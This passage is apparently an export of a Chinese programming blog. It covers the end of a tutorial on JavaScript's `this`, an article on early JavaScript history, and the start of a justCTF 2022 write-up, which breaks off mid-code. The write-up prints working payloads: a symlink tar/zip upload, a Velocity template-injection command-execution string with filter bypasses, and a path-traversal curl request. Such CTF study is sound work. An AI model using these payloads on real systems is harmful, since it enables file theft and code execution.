從來都不是一件什麼困難的事。它代表的就是在物件導向裡面，那個 instance 本身。 我舉個例子： class Car &#123; setName(name) &#123; this.name = name &#125; getName() &#123; return this.name &#125; &#125; const myCar = new Car() myCar.setName('hello') console.log(myCar.getName()) // hello 在上面我們宣告了一個 class Car，寫了 setName 跟 getName 兩個方法，在裡面用this.name來存取這個 instance 的屬性。 為什麼要這樣寫？因為這是唯一的方法，不然你要把 name 這個屬性存在哪裡？沒有其他地方讓你存了。所以 this 的作用在這裡是顯而易見的，所指到的對象就是那個 instance 本身。 以上面的範例來說，myCar.setName(&#39;hello&#39;)，所以 this 就會是myCar。在物件導向的世界裡面，this 的作用就是這麼單純。 或者換句話說，我認為： 一但脫離了物件導向，其實 this 就沒有什麼太大的意義 假設今天 this 只能在 class 裡面使用，那應該就不會有任何問題對吧？你有看過其他程式語言像是寫 Java 或是 C++ 的人在抱怨說 this 很難懂嗎？沒有，因為 this 的作用很單純。 那問題是什麼？問題就是在 JavaScript 裡面，你在任何地方都可以存取到 this。所以在 JavaScript 裡的 this 跟其他程式語言慣用的那個 this 有了差異，這就是為什麼 this 難懂的原因。 儘管 this 的定義不太一樣，但我認為本質上還是很類似的。要理解 this 的第一步就是告訴自己：「一但脫離了物件，就不太需要關注 this 的值，因為沒什麼意義」 沒什麼太大意義的 thisfunction hello()&#123; console.log(this) &#125; hello() this 的值會是什麼？ 延續我們前面所講的，在這種情況下我會跟你說 this 沒有任何意義，而且你千萬不要想成 this 會指到hello這個 function，沒有這種事。 只要記得我前面跟你說的：「脫離了物件，this 的值就沒什麼意義」。 在這種很沒意義的情況下，this 的值在瀏覽器底下就會是window，在 node.js 底下會是global，如果是在嚴格模式，this 的值就會是undefined。 這個規則應該滿好記的，幫大家重新整理一下： 嚴格模式底下就都是undefined 非嚴格模式，瀏覽器底下是window 非嚴格模式，node.js 底下是global 這個就是你在其他文章看到的「預設綁定」，但我在這篇不打算用任何專有名詞去談 this。我認為不用這些名詞也不會妨礙你的理解，甚至還有可能讓你更好理解。我也不是說專有名詞不重要，是說可以先把概念學起來，再回過頭來補專有名詞。 一但脫離了物件，this 的值就沒什麼意義，在沒意義的情況底下就會有個預設值，而預設值也很好記，嚴格模式就是undefined，非嚴格模式底下就是全域物件。 更改 this 的值僅管 this 可能有預設的值，但我們可以透過一些方法來改它。這改的方法也很簡單，一共有三種。 前兩種超級類似，叫做call跟apply，這兩種都是能夠呼叫 fucntion 的函式，我舉一個例子給你看比較好懂： 'use strict'; function hello(a, b)&#123; console.log(this, a, b) &#125; hello(1, 2) // undefined 1 2 hello.call(undefined, 1, 2) // undefined 1 2 hello.apply(undefined, [1, 2]) // undefined 1 2 我們有一個叫做 hello 的函式，會 log 出 this 的值以及兩個參數。在我們呼叫hello(1, 2)的時候，因為是嚴格模式所以 this 是 undefined，而 a 跟 b 就是 1 跟 2。 當我們呼叫hello.call(undefined, 1, 2)的時候，我們先忽略第一個參數不談，你可以發現他其實跟hello(1, 2)是一樣的。 而 apply 的差別只在於他要傳進去的參數是一個 array，所以上面這三種呼叫 function 的方式是等價的，一模一樣。除了直接呼叫 function 以外，你也可以用 call 或是 apply 去呼叫，差別在於傳參數的方式不同。 call 跟 apply 的差別就是這麼簡單，一個跟平常呼叫 function 一樣，一個用 array 包起來。 那我們剛剛忽略的第一個參數到底是什麼呢？ 你可能已經猜到了，就是this的值！ 'use strict'; function hello(a, b)&#123; console.log(this, a, b) &#125; hello.call('yo', 1, 2) // yo 1 2 hello.apply('hihihi', [1, 2]) // hihihi 1 2 就是如此簡單，你第一個參數傳什麼，裡面 this 的值就會是什麼。儘管原本已經有 this，也依然會被這種方法給覆蓋掉： class Car &#123; hello() &#123; console.log(this) &#125; &#125; const myCar = new Car() myCar.hello() // myCar instance myCar.hello.call('yaaaa') // yaaaa 原本 this 的值應該要是 myCar 這個 instance，可是卻被我們在使用 call 時傳進去的參數給覆蓋掉了。 除了以上兩種以外，還有最後一種可以改變 this 的方法：bind。 'use strict'; function hello() &#123; console.log(this) &#125; const myHello = hello.bind('my') myHello() // my bind 會回傳一個新的 function，在這邊我們把 hello 這個 function 用 my 來綁定，所以最後呼叫 myHello() 時會輸出 my。 以上就是三種可以改變 this 的值的方法。你可能會好奇如果我們把 call 跟 bind 同時用會怎樣： 'use strict'; function hello() &#123; console.log(this) &#125; const myHello = hello.bind('my') myHello.call('call') // my 答案是不會改變，一但 bind 了以後值就不會改變了。 這邊還要特別提醒的一點是在非嚴格模式底下，無論是用 call、apply 還是 bind，你傳進去的如果是 primitive 都會被轉成 object，舉例來說： function hello() &#123; console.log(this) &#125; hello.call(123) // [Number: 123] const myHello = hello.bind('my') myHello() // [String: 'my'] 幫大家做個中場總結： 在物件以外的 this 基本上沒有任何意義，硬要輸出的話會給個預設值 可以用 call、apply 與 bind 改變 this 的值 物件中的 this最前面我們示範了在物件導向 class 裡面的 this，但在 JavaScript 裡面還有另外一種方式也是物件： const obj = &#123; value: 1, hello: function() &#123; console.log(this.value) &#125; &#125; obj.hello() // 1 這種跟一開始的物件導向範例不太一樣，這個範例是直接創造了一個物件而沒有透過 class，所以你也不會看到 new 這個關鍵字的存在。 再繼續往下講之前，要大家先記住一件事情： this 的值跟作用域跟程式碼的位置在哪裡完全無關，只跟「你如何呼叫」有關 這個機制恰巧跟作用域相反，不確定我在說什麼的可以先看這篇：所有的函式都是閉包：談 JS 中的作用域與 Closure。 舉個簡單的例子來幫大家複習一下作用域： var a = 10 function test()&#123; console.log(a) &#125; const obj = &#123; a: 'ojb', hello: function() &#123; test() // 10 &#125;, hello2: function() &#123; var a = 200 test() // 10 &#125; &#125; test() // 10 obj.hello() obj.hello2() 無論我在哪裡，無論我怎麼呼叫test這個 function，他印出來的 a 永遠都會是全域變數的那個 a，因為作用域就是這樣運作，test 在自己的作用域裡面找不到 a 於是往上一層找，而上一層就是 global scope，這跟你在哪裡呼叫 test 一點關係都沒有。test 這個 function 在「定義」的時候就把 scope 給決定好了。 但 this 卻是完全相反，this 的值會根據你怎麼呼叫它而變得不一樣，還記得我們剛講過的 call、apply 跟 bind 嗎？這就是其中一個範例，你可以用不同的方式去呼叫 function，讓 this 的值變得不同。 所以你要很清楚知道這是兩種完全不同的運行模式，一個是靜態（作用域）、一個是動態（this）。要看作用域，就看這個函式在程式碼的「哪裡」；要看 this，就看這個函式「怎麽」被呼叫。 舉一個最常見的範例： const obj = &#123; value: 1, hello: function() &#123; console.log(this.value) &#125; &#125; obj.hello() // 1 const hey = obj.hello hey() // undefined 明明就是同一個函式，怎麼第一次呼叫時 this.value 是 1，第二次呼叫時就變成 undefined 了？ 記住我剛說的話：「要看 this，就看這個函式『怎麽』被呼叫」。 再繼續往下講之前，先教大家一個最重要的小撇步，是我從this 的值到底是什么？一次说清楚學來的，是一個很方便的方法。 其實我們可以把所有的 function call，都轉成利用call的形式來看，以上面那個例子來說，會是這樣： const obj = &#123; value: 1, hello: function() &#123; console.log(this.value) &#125; &#125; obj.hello() // 1 obj.hello.call(obj) // 轉成 call const hey = obj.hello hey() // undefined hey.call() // 轉成 call 而規則就是你在呼叫 function 以前是什麼東西，你就把它放到後面去。所以obj.hello()就變成了obj.hello.call(obj)，hey()前面沒有東西，所以就變成了hey.call()。 轉成這樣子的形式之後，還記得 call 的第一個參數就是 this 嗎？所以你就能立刻知道 this 的值是什麼了！ 舉一個更複雜的例子： const obj = &#123; value: 1, hello: function() &#123; console.log(this.value) &#125;, inner: &#123; value: 2, hello: function() &#123; console.log(this.value) &#125; &#125; &#125; const obj2 = obj.inner const hello = obj.inner.hello obj.inner.hello() obj2.hello() hello() 你可以不要往下拉，先想一下那三個 function 會各自印出什麼值。 接著我要公布解答了，只要轉成我們上面講的那種形式就好： obj.inner.hello() // obj.inner.hello.call(obj.inner) => 2 obj2.hello() // obj2.hello.call(obj2) => 2 hello() // hello.call() => undefined 特別講一下最後一個 hello 因為沒有傳東西進去，所以是預設綁定，在非嚴格模式底下是 window，所以會 log 出window.value也就是 undefined。 只要你把 function 的呼叫轉成用 call 的這種形式，就很容易看出來 this 的值是什麼。 這也是我前面一直在提的：「要看 this，就看這個函式『怎麽』被呼叫」，而你要看怎麼被呼叫的話，就轉成 call 的形式就行了。 學到這邊，其實你看見九成與 this 相關的題目你都會解了，不信的話我們來試試看（為了可讀性沒有防雷空行，所以請自行拉到程式碼就好，再往下拉就會是解答了）： function hello() &#123; console.log(this) &#125; var a = &#123; value: 1, hello &#125; var b = &#123; value: 2, hello &#125; hello() a.hello() b.hello.apply(a) 只要按照我們之前說的，用 call 來轉換一下形式就好： hello() // hello.call() => window（瀏覽器非嚴格模式） a.hello() // a.hello.call(a) => a b.hello.apply(a) => 直接用 apply，所以就是 a 再來一題比較不一樣的，要看仔細囉（假設在瀏覽器底下跑，非嚴格模式）： var x = 10 var obj = &#123; x: 20, fn: function() &#123; var test = function() &#123; console.log(this.x) &#125; test() &#125; &#125; obj.fn() 這題的話如果你搞錯，一定是你忘記了我們最重要的一句話： 要看 this，就看這個函式「怎麽」被呼叫 我們怎麼呼叫 test 的？test()，所以就是test.call()就是預設綁定，this的值就會是 window，所以this.x會是 10，因為在第一行宣告了一個全域變數 x &#x3D; 10。 寫到這裡，再來幫大家做個回顧，避免大家忘記前面在講什麼： 脫離物件的 this 基本上沒有任何意義 沒有意義的 this 會根據嚴格模式以及環境給一個預設值 嚴格模式底下預設就是 undefined，非嚴格模式在瀏覽器底下預設值是 window 可以用 call、apply 與 bind 改變 this 的值 要看 this，就看這個函式「怎麽」被呼叫 可以把 a.b.c.hello() 看成 a.b.c.hello.call(a.b.c)，以此類推，就能輕鬆找出 this 的值 不合群的箭頭函式原本有關 this 的部分應該講到上面就要結束了，但 ES6 新增的箭頭函式卻有不太一樣的運作方式。它本身並沒有 this，所以「在宣告它的地方的 this 是什麼，它的 this 就是什麼」，好，我知道這聽起來超難懂，我們來看個範例： const obj = &#123; x: 1, hello: function()&#123; // 這邊印出來的 this 是什麼，test 的 this 就是什麼 // 就是我說的： // 在宣告它的地方的 this 是什麼，test 的 this 就是什麼 console.log(this) const test = () => &#123; console.log(this.x) &#125; test() &#125; &#125; obj.hello() // 1 const hello = obj.hello hello() // undefined 在第五行我們在 hello 這個 function 裡面宣告了 test 這個箭頭函式，所以 hello 的 this 是什麼，test 的 this 就是什麼。 所以當我們呼叫obj.hello()時，test 的 this 就會是 obj；hello()的時候 test 的 this 就會是全域物件。這規則其實都跟之前一樣，差別只有在於說箭頭函式的 this 不是自己決定的，而是取決於在宣告時那個地方的 this。 如果你想看更複雜的範例，可以參考這篇：鐵人賽：箭頭函式 (Arrow functions) 實際應用：React你有寫過 React 的話，就會知道裡面其實有些概念今天的教學可以派上用場，舉例來說，我們必須在 constructor 裡面先把一些 method 給 bind 好，你有想過是為什麼嗎？ 先來看看如果沒有 bind 的話會發生什麼事： class App extends React.Component &#123; onClick() &#123; console.log(this, 'click') &#125; render() &#123; return &lt;button onClick=&#123;this.onClick&#125;>click&lt;/button> &#125; &#125; 最後 log 出來的值會是 undefined，為什麼？這細節就要看 React 的原始碼了，只有 React 知道實際上在 call 我們傳下去的 onClick 函式時是怎麼呼叫的。 所以為什麼要 bind？為了確保我們在onClick裡面拿到的 this 永遠都是這個 instance 本身。 class App extends React.Component &#123; constructor() &#123; super() // 所以當你把 this.onClick 傳下去時，就已經綁定好了 this // 而這邊的 this 就是這個 component this.onClick = this.onClick.bind(this) &#125; onClick() &#123; console.log(this, 'click') &#125; render() &#123; return &lt;button onClick=&#123;this.onClick&#125;>click&lt;/button> &#125; &#125; 還有另外一種方式是用箭頭函式： class App extends React.Component &#123; render() &#123; return &lt;button onClick=&#123;() => &#123; console.log(this) &#125;&#125;>click&lt;/button> &#125; &#125; 為什麼箭頭函式也可以？因為我們前面提過，「在宣告它的地方的 this 是什麼，它的 this 就是什麼」，所以這邊 log 出來的 this 就會是 render 這個 function 的 this，而 render 的 this 就是這個 component。 如果你有點忘記了，可以把文章拉到最上面去，因為最上面我們就已經提過這些了。 總結關於講解 this 的文章，我至少看過十幾二十篇，比較常見的就是講幾種不同的綁定方法，以及在哪些時候會用哪一種綁定。但這些我在這篇文章裡都沒有提，因為我認為不影響理解（但最好之後能夠自己去補足相關名詞）。 我也曾經迷惘過，曾經被 this 搞得很混亂，前陣子因為教學的緣故不得不把 this 搞懂，而我也確實比以前理解很多了。從我的經驗看來，我認為 this 之所以複雜，原因之一就是：「在物件以外的地方也可以用 this」，所以我才一再強調我認為物件外的 this 是沒意義的。 我對 this 真正開竅的時候是看到了this 的值到底是什么？一次说清楚這篇文章，簡直就是醍醐灌頂，把一般的 function 呼叫換成用 call 的這種形式是個很容易理解也很容易記的方法，而且可以應用在九成的場景底下。 最後，再次強調這篇文章是有疏漏的，開頭的那幾個範例以這篇文章所學到的知識依然無法解釋，那真的是要看 ECMAScript 才會知道；而瀏覽器的 event 的 this 我也沒提，但這部分比較簡單就是了。我只求這篇文章能讓你知道八成的狀況底下 this 的值會是什麼，其他兩成請另尋高明。 這篇融合了我看過的幾篇文章帶給我的想法，也融合了自己融會貫通後的體悟，希望我也能帶給那些卡在 this 許久的初學者們一些新的想法，在看完這篇文章之後能夠以不同的角度去思考 this 的值以及它存在的意義。 寫完這篇以後，關於 JavaScript 那些非常常見但我以前完全沒弄懂的問題就都解釋的差不多了，有興趣的朋友們可以參考其他的主題： 該來理解 JavaScript 的原型鍊了 深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？ 我知道你懂 hoisting，可是你了解到多深？ 所有的函式都是閉包：談 JS 中的作用域與 Closure 參考資料： JavaScript深入之从ECMAScript规范解读this this 的值到底是什么？一次说清楚 What’s THIS in JavaScript ? JS this","link":"/2019/02/23/javascript-what-is-this/"},{"title":"從歷史開始認識 JavaScript","text":"我認為想要真正認識 JavaScript 的話，要從歷史開始。為什麼？因為從它的歷史，可以知道為什麼某些部分是這樣子設計，為什麼會有這些看似奇怪的行為。雖然有些古早的知識可能沒什麼實際用途，但對我來說是很有趣的。 學習它的歷史，並不是死背它出現的年代或是當初花了幾天開發設計，而是要去理解它出現的脈絡，去理解為什麼需要它，又為什麼它是這樣子被設計的。 想了解 JavaScript 的歷史，我最推薦的是這個資源：JavaScript: The First 20 Years，因為 JavaScript 之父 Brendan Eich 也是作者之一，想看中譯版的話在這邊：JavaScript 二十年。 這本書紀錄了從 1995 年到 2015 年，一共二十年的 JavaScript 歷史，如果有時間的話我強烈建議你把它全部看完，會對 JavaScript 有不同的體會（還會知道很多冷知識）。 底下我會挑一些我覺得比較重要的東西來寫，資料來源沒有特別講的話，都是來自於上面提到的那本書，所以若是覺得似曾相似是正常的。 由於我跟 JavaScript 差不多時候出生，因此這些早期的歷史我並沒有親身體會過，若是寫得好像我有親身參與的話，全都是想像而已。 JavaScript 的誕生我覺得在讀歷史的時候，講到年代有個重點，那就是要讓大家感同身受，否則就只是冷冰冰的文字而已。 1993 年，知名的圖形瀏覽器 Mosaic 誕生（是知名的，但不是第一個）。你可能會疑惑為什麼我要強調「圖形」這兩個字，難道有瀏覽器是純文字的嗎？還真的有。 像是 1992 年出現的 Lynx，或者是 2011 年推出的 w3m，都是純文字的瀏覽器。 用 w3m 看我的部落格的話，會長得像這樣： 有興趣想玩玩看的，可以在 Linux 系統上把 w3m 裝起來：apt-get install w3m，然後 w3m https://blog.huli.tw，就可以看到了。 接著 1994 年年底，網景（Netscape）的 Netscape Navigator 推出了，並且迅速的擴張，在幾個月後就成為了瀏覽器中的霸主。 1994 年是什麼樣的年代？是 iPhone 第一代誕生前 13 年，Windows 95 誕生的前一年，那時候還沒有「手機」這個名稱，而是叫做大哥大。神機 Nokia 3310 是在 2000 年推出的，這也是六年以後的事情了。 台灣的網路是從 1985 年學術網路開始，在 1991 才正式連接全球，1994 年 HiNet 才成立，1995 年才有蕃薯藤與 Ptt。 在 1994 年的時候，這些都還不存在，可見那是一個相對早期的時代，也是網路正要開始蓬勃發展的年代。 而這樣一個正要興起的市場，自然人人都想要來分一杯羹。微軟在 1994 年年底時提出了收購 Netscape 的計畫，但是被拒絕了，而 Netscape 的管理層在那時便意識到未來很有可能會面臨到來自微軟的競爭——大名鼎鼎的 IE，就是在不久後的 1995 年 8 月所推出的。 那時的 Netscape 原本就想在瀏覽器上加入一個腳本語言，正好在 1995 年年初時 Sun 帶著還沒正式發佈的 Java 找上了 Netscape，並且達成了合作，同意把 Java 整合進 Netscape 2 中，兩間公司手牽手一起擊敗微軟，這就是後來的 Java Applet。 我相信有很多跟我一樣年輕的人，都不知道 Java Applet 是什麼。總之呢，你可以用 Java 寫一個應用程式，編譯過後放到網頁上面去，讓瀏覽器幫你開啟 Java 來執行，這樣的好處是使用者不需要主動下載 Java application，都靠瀏覽器幫你搞定就好。 從維基百科上可以看到 Java Applet 的寫法： import java.applet.Applet; import java.awt.*; // Applet code for the \"Hello, world!\" example. // This should be saved in a file named as \"HelloWorld.java\". public class HelloWorld extends Applet &#123; // This method is mandatory, but can be empty (i.e., have no actual code). public void init() &#123; &#125; // This method is mandatory, but can be empty.(i.e.,have no actual code). public void stop() &#123; &#125; // Print a message on the screen (x=20, y=10). public void paint(Graphics g) &#123; g.drawString(\"Hello, world!\", 20,10); // Draws a circle on the screen (x=40, y=30). g.drawArc(40,30,20,20,0,360); &#125; &#125; 這樣的程式碼會在畫面上畫出一個 Hello, World 來。把上面的 Java 編譯過後產生 class 檔，就可以嵌入到網頁中了： &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"> &lt;HTML> &lt;HEAD> &lt;TITLE>HelloWorld_example.html&lt;/TITLE> &lt;/HEAD> &lt;BODY> &lt;H1>A Java applet example&lt;/H1> &lt;P>Here it is: &lt;APPLET code=\"HelloWorld.class\" WIDTH=\"200\" HEIGHT=\"40\"> This is where HelloWorld.class runs.&lt;/APPLET>&lt;/P> &lt;/BODY> &lt;/HTML> 那既然有了這麼強大的網頁應用程式，為什麼還需要一個腳本語言呢？不能也用 Java 嗎？ 原因是有些簡單的應用如果用 Java 來寫會顯得太笨重，例如說你可能只是想要做個 input 的欄位檢查，但如果用 Java 你還要先學會物件導向 Class 的概念，還要熟悉整個 Java 生態系，寫了 10 幾行的 boilerplate 後才能開始寫你想要的功能。 因此，在 1995 年加入 Netscape 的 Brendan Eich，接到的任務就是要開發出一個在瀏覽器上執行的程式語言，要輕量，而且要長得像 Java。為什麼要長得像 Java？因為一開始，它就是做為 Java 的輔助語言而誕生的，而這個語言暫時命名為 Mocha。 因為時間緊迫的關係，Brendan Eich 花了十天打造出了 Mocha 的 prototype。而「長得像 Java」這個來自上層的需求，也影響了 JavaScript 的設計，不過除了 Java，JavaScript 也參考了 C、AWK、Scheme 以及 Self 等程式語言。 許多人都聽過一句話，「Java 跟 JavaScript 的關係，就像狗跟熱狗一樣」，但實際上，或許他們的淵源比你想得還要深，並不只是跟風或是名字類似而已。 舉例來說，有許多人應該都碰過一個莫名其妙的設計： console.log(new Date()) // Thu Aug 19 2021 22:55:22 GMT+0800 (台北標準時間) console.log(new Date().getMonth()) 7 明明是八月，為什麼 log 出來卻是 7？這個設計你以為是 JavaScript 獨創的嗎？不是，其實是從 JDK 1.0 的 java.util.Date 抄來的，這是當時的文件 那為什麼 Java 要這樣做呢？有人指出可能是因為在更古老的 C 的 localtime 中，month 就是從 0 開始的。 更多相關資源可以參考： Why does the month argument range from 0 to 11 in JavaScript’s Date constructor? Javascript Date method inconsistency - getDate vs getMonth 而有關於 JavaScript 之父對於這些討論的回覆中，也可以再次看出「JavaScript 要長得像 Java」這個需求： 在 1995 年 5 月一篇由 Netscape 所發布的新聞稿中，正式推出了 JavaScript，副標題就是： 28 INDUSTRY-LEADING COMPANIES TO ENDORSE JAVASCRIPT AS A COMPLEMENT TO JAVA FOR EASY ONLINE APPLICATION DEVELOPMENT 說明了 JavaScript 是為了輔助 Java 而存在。 在這篇新聞稿中其實也可以看到許多 JavaScript 的特性，像是： JavaScript is analogous to Visual Basic in that it can be used by people with little or no programming experience to quickly construct complex applications. JavaScript’s design represents the next generation of software designed specifically for the Internet and is: 1.designed for creating network-centric applications2.complementary to and integrated with Java3.complementary to and integrated with HTML4.open and cross-platform. 他們把 JavaScript 比喻成 Visual Basic，簡單容易上手，而 JavaScript 更是 Java Applet 與 HTML 的橋樑。你可以把 Java Applet 想成是一個獨立的應用程式，脫離網頁而存在，如果想要改變網頁上的內容，需要透過 JavaScript 這個橋樑來輔助，如同下面這一段所說： With JavaScript, an HTML page might contain an intelligent form that performs loan payment or currency exchange calculations right on the client in response to user input. A multimedia weather forecast applet written in Java can be scripted by JavaScript to display appropriate images and sounds based on the current weather readings in a region JavaScript 可以獨立存在，做為 HTML 的輔助，處理一些基本邏輯，也可以跟 Java Applet 一起使用。在早期的文件中，有提到 Java 跟 JavaScript 彼此之間如何溝通（參考自 Java-to-Javascript Communication） import netscape.javascript.*; import java.applet.*; import java.awt.*; class MyApplet extends Applet &#123; public void init() &#123; JSObject win = JSObject.getWindow(this); JSObject doc = (JSObject) win.getMember(\"document\"); JSObject loc = (JSObject) doc.getMember(\"location\"); String s = (String) loc.getMember(\"href\"); // document.location.href win.call(\"f\", null); // Call f() in HTML page &#125; &#125; 會利用 JSObject 這個物件來取得 DOM。在另一個教學網頁裡面有著更完整的範例： /* Mastering JavaScript, Premium Edition by James Jaworski ISBN:078212819X Publisher Sybex CopyRight 2001 */ &lt;title>Accessing JavaScript from an applet&lt;/TITLE> &lt;form NAME=\"textForm\"> &lt;P>Enter some text and then click Display Text: &lt;INPUT TYPE=\"text\" NAME=\"textField\" SIZE=\"20\">&lt;/P> &lt;/FORM> &lt;APPLET CODE=\"ReadForm.class\" WIDTH=400 HEIGHT=100 NAME=\"readApp\" MAYSCRIPT> [The ReadForm Applet] &lt;/APPLET> //Reading a JavaScript Form (ReadForm.java) import java.applet.*; import java.awt.*; import java.awt.event.*; import netscape.javascript.JSObject; import netscape.javascript.JSException; public class ReadForm extends Applet &#123; String text=\"Enter some text for me to display!\"; Font font = new Font(\"TimesRoman\",Font.BOLD+Font.ITALIC,24); JSObject win, doc, form, textField; public void init() &#123; win = JSObject.getWindow(this); doc = (JSObject) win.getMember(\"document\"); form = (JSObject) doc.getMember(\"textForm\"); textField = (JSObject) form.getMember(\"textField\"); setLayout(new BorderLayout()); Panel buttons = new Panel(); Button displayTextButton = new Button(\"Display Text\"); displayTextButton.addActionListener(new ButtonEventHandler()); buttons.add(displayTextButton); add(\"South\",buttons); &#125; public void paint(Graphics g) &#123; g.setFont(font); g.drawString(text,30,30); &#125; class ButtonEventHandler implements ActionListener &#123; public void actionPerformed(ActionEvent e)&#123; String s = e.getActionCommand(); if(\"Display Text\".equals(s)) &#123; text= (String) textField.getMember(\"value\"); win.eval(\"alert(\\\"This alert comes from Java!\\\")\"); repaint(); &#125; &#125; &#125; &#125; 新聞稿中還有另一段更有趣的： A server-side JavaScript script might pull data out of a relational database and format it in HTML on the fly. A page might contain JavaScript scripts that run on both the client and the server. On the server, the scripts might dynamically compose and format HTML content based on user preferences stored in a relational database, and on the client, the scripts would glue together an assortment of Java applets and HTML form elements into a live interactive user interface for specifying a net-wide search for information. 懶得看的話，關鍵字是「A page might contain JavaScript scripts that run on both the client and the server.」，我沒看錯吧，在 1995 年的時候，JavaScript 就可以跑在 server side 了嗎？ 對，就是這麼神奇，我大 JavaScript 早在 25 年前就已經稱霸全端，程式碼長得像這樣： 看起來有點像是 PHP，可以嵌入會在後端執行的程式碼，並且輸出結果。 如果你對這個有興趣，當初的歷史文件還保留著，底下這些文件會教你一步步用 JavaScript 寫出一個後端的應用程式： Server-Side JavaScript Reference Writing Server-Side JavaScript Applications 若是想了解更多這段歷史，可以參考 Server-side JavaScript a decade before Node.js with Netscape LiveWire 想要查資料的話可以用 Netscape LiveWire 當作關鍵字，不能只用 LiveWire JS，因為你會找到 Laravel Livewire，一個基於 Laravel 的全端框架。 結語Java 與 JavaScript 確實是兩個不同的程式語言，雖然當初採用 JavaScript 這個名字有更多是基於行銷上的考量，但不可否認地，JavaScript 的一些特性確實受到了 Java 的影響。 在 JavaScript creator Brendan Eich | True Technologist Ep 1 這支影片中，JavaScript 之父 Brendan Eich 也有稍微提到當年的一些歷史；除此之外，還有對於 TypeScript 跟 WebAssembly 的看法，有興趣的話也可以聽聽看。 這篇文章只有提到歷史長河中的一小段而已，在這之後其實還有許多有趣的歷史，但我覺得我目前再怎麼寫也不會比《JavaScript: The First 20 Years》寫得好，因此歷史的部分就先在這裡打住吧。 如果你有興趣了解更多 JavaScript 早期的設計跟歷史，那我再次推薦這本書。 參考資料： Wikipedia: Java applet Wikipedia: JavaScript 台灣網路發展大事記總表(1985~2014) Re: applet 即將走入歷史？ 用十分鐘瞭解 《JavaScript的程式世界》 js 简史 新时代新潮流 WebOS【17】需要不需要 JavaScript 技術應用的艱辛探索 Java-to-Javascript Communication Using JavaScript in an Applet : Applet Jar « Development « JavaScript DHTML NETSCAPE AND SUN ANNOUNCE JAVASCRIPT, THE OPEN, CROSS-PLATFORM OBJECT SCRIPTING LANGUAGE FOR ENTERPRISE NETWORKS AND THE INTERNET JavaScript: The First 20 Years","link":"/2022/01/15/js-history/"},{"title":"justCTF 2022 筆記","text":"這個假日有 justCTF 跟全部都是 web 的 WeCTF，我本來想說兩個都打，一邊卡住的話可以跳到另一邊，殊不知兩邊都卡住XD 這次 justCTF 滿多不錯的 web 題，依照慣例寫一下筆記並且記一下關鍵字： zip&#x2F;tar symlink Velocity SSTI Golang path git 原理 scp 原理 xsleak, STTF + :target selector 底下的順序以解開的數量排序，越前面越多人解開。 Symple Unzipper(40 solves)這題的目標是讀到跟 server code 在同一層的 flag.txt 這個檔案。 核心程式碼如下： ROOT_DIR = Path(__file__).absolute().parent UPLOAD_DIR = ROOT_DIR / \"uploads\" FLAG_PATH = ROOT_DIR / \"flag.txt\" SOURCE_PATH = ROOT_DIR / \"server.tar.gz\" @app.post(\"/extract\", tags=[\"extract\"]) async def extract(file: UploadFile): \"\"\"Extracts the given ZIP and returns a JSON object containing the contents of every file extracted\"\"\" with TemporaryDirectory(dir=UPLOAD_DIR) as tmpdir: file_to_extract = Path(tmpdir) / file.filename with open(file_to_extract, \"wb\") as f: while True: data = await file.read(2048) if not data: break f.write(data) # make sure the file is a valid zip because Python's zipfile doesn't support symlinks (no hacking!) if not is_zipfile(file_to_extract): raise HTTPException(status_code=415, detail=f\"The input file must be an ZIP archive.\") with TemporaryDirectory(dir=tmpdir) as extract_to_dir: try: extract_archive(str(file_to_extract), outdir=extract_to_dir) except PatoolError as e: raise HTTPException(status_code=400, detail=f\"Error extracting ZIP &#123;file_to_extract.name&#125;: &#123;e!s&#125;\") return read_files(extract_to_dir) 先用 is_zipfile 檢查是不是 zip，然後用 patool 的 extract_archive 去解壓縮檔案。從檔名看來就一副跟 symlink 有關的樣子，比賽中我有試過用 zip 去打包 symlink 檔案但是沒用，這題後來是隊友解掉的。 從 discord 裡面看到別人 po 的解答： ln -fs ..&#x2F;..&#x2F;..&#x2F;flag.txt . touch a zip a.zip -xi a tar --owner 0 --group 0 -cvf payload.tar flag.txt a.zip curl -v $&#123;1:-symple-unzipper.web.jctf.pro&#125;&#x2F;extract -F &#39;file&#x3D;@payload.tar&#39; 看了一下其他人在 discord 裡面的討論，大意是說上面這樣做以後，檔案開頭是 tar 的格式，結尾是你包進去的那個 zip，而 is_zipfile 的實作會導致這樣的檔案可以通過（似乎是先檢查 magic byte，找不到會用其他方式判定），因此被判定為是 true，接著就會被底下的 extract_archive 把 tar 解開，然後保留你的 symlink。 Velociraptor(22 solves)這題是 Velocity 的 SSTI，上網找會找到這個 RCE payload： #set($e=\"e\") $e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"touch /tmp/rai4over\") 但是這題因為把這鎖住了所以不能用，flag 在根目錄底下，所以其實不需要 RCE，只要能讀檔就行了，Velocity 有個 include 的指令： #include( &quot;&#x2F;flag.txt&quot; ) 但直接用會丟一個錯誤給你： Malicious input detected (#include, #parse) 要想辦法繞，我在 discord 裡面看到有人這樣繞： #set($x&#x3D;&quot;#includ&quot;) #set($y&#x3D;&#39;e(&quot;&#x2F;flag.txt&quot;)&#39;) #set($a&#x3D;&quot;$x$y&quot;) #evaluate($a) 然後也有人用 unicode 來繞： #set($x&#x3D;&quot;#includ\\u0065(&#39;&#x2F;flag.txt&#39;)&quot;) $x GoBucket(18 solves)這題的核心程式碼如下： r.HandleFunc(\"/files/&#123;bucketId&#125;/&#123;filename&#125;\", handleBucket) bucketPath := filepath.Join(\"./buckets/\", bucketId) // [...] filePath := filepath.Join(bucketPath, filename) 從網址配對到 bucketId 跟 filename 以後，做 path 的拼接然後去拿檔案，我們的目標是 buckets/secret_file 這個檔案。 解法是： curl --path-as-is &#39;http:&#x2F;&#x2F;gobucket.web.jctf.pro&#x2F;files&#x2F;\\&#x2F;secret_file&#39; 從討論中看起來應該是 golang 在處理網址配對時不會把 /\\/ 這種東西變成 /// 之類的，所以 \\ 就變成一個參數，然後在 windows 上面在做 path join 的時候就沒效果，導致最後的結果可以逃出一層資料夾，讀到 secret_file 這個檔案。 底下貼原文解釋筆記一下： golang when it parses the http path and resolves stuff like /../ into / etc., doesn’t treat a backslash as a slash as some other things might which allows the backslash to end up being a parameterand (this appears on windows only because of the way it handles paths) when that path parameter ends up being used for constructing a filepath, it can potentially be dangerous as it allows you to skip&#x2F;escape a directory gitara(12 solves)這題的程式碼如下： &lt;?php if (!isset($_POST[&#39;domain&#39;]) || preg_match(&#39;&#x2F;[^a-z0-9.-]&#x2F;ims&#39;, 